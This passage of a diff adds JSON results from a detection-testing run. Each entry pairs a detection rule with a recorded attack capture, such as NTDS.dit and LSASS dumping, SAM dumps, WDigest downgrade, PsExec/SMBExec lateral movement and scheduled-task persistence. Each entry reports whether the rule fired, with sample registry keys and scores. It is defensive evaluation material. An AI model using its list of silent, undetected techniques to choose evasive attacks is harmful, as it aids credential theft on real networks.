+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_launcher_vbs",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_download_cradle",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_launcher_vbs",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "powershell_intent_first",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "score": "55"
+    }
+   ]
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_launcher_vbs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "score": "80"
+    }
+   ]
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": true,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "score": "80"
+    }
+   ]
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "psexec_smb_service_execution",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents",
+    "DeviceFileEvents",
+    "DeviceNetworkEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_launcher_vbs",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_wdigest_downgrade",
+   "own": true,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "fires",
+   "rows": 1,
+   "sample": [
+    {
+     "what": "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
+     "score": "90"
+    }
+   ]
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_lsa_security_providers",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": true,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "fires",
+   "rows": 6,
+   "sample": [
+    {
+     "what": "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Cyb3rWard0g",
+     "score": "95"
+    },
+    {
+     "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{FA103B2E-5EB2-499F-9443-9765F29C7B5B}",
+     "score": "90"
+    },
+    {
+     "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{A1A4F90B-9598-45B7-85D2-AE21B341085D}",
+     "score": "90"
+    }
+   ]
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_launcher_vbs",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_psexec_dcerpc_tcp_svcctl",
+   "own": true,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "fires",
+   "rows": 3,
+   "sample": [
+    {
+     "what": "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Updater",
+     "score": "135"
+    },
+    {
+     "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{BCE37B91-785E-47AE-B422-F03C44349FEC}",
+     "score": "90"
+    },
+    {
+     "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{BCE37B91-785E-47AE-B422-F03C44349FEC}",
+     "score": "90"
+    }
+   ]
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_schtasks_creation_execution_elevated_user",
+   "own": true,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "fires",
+   "rows": 26,
+   "sample": [
+    {
+     "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start",
+     "score": "90"
+    },
+    {
+     "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
+     "score": "90"
+    },
+    {
+     "what": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{FA103B2E-5EB2-499F-9443-9765F29C7B5B}",
+     "score": "90"
+    }
+   ]
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_schtasks_creation_standard_user",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_shell_reg_dump_sam",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_smbexec_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_uac_shellapi_fodhelper",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_wdigest_downgrade",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "empire_wmi_dcerpc_wmi_IWbemServices_ExecMethod",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "psh_lsass_memory_dump_comsvcs",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "registry_service_taskcache_persistence",
+   "capture": "schtask_create",
+   "own": false,
+   "tables": [
+    "DeviceRegistryEvents",
+    "DeviceFileEvents",
+    "DeviceFileCertificateInfo"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "cmd_bitsadmin_download_psh_script",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "cmd_dumping_ntds_dit_file_ntdsutil",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "cmd_dumping_ntds_dit_file_volume_shadow_copy",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "cmd_psexec_lsa_secrets_dump",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "covenant_sharpsc_create_dcerpc_smb_svcctl",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "nodata",
+   "rows": 0
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "covenant_wmi_remote_event_subscription_ActiveScriptEventConsumers",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_launcher_sct_regsvr32",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_launcher_vbs",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
+   "sample": []
+  },
+  {
+   "detection": "scheduled_task_abuse",
+   "capture": "empire_ninjacopy_dumping_ntds_dit_file",
+   "own": false,
+   "tables": [
+    "DeviceProcessEvents"
+   ],
+   "status": "silent",
+   "rows": 0,
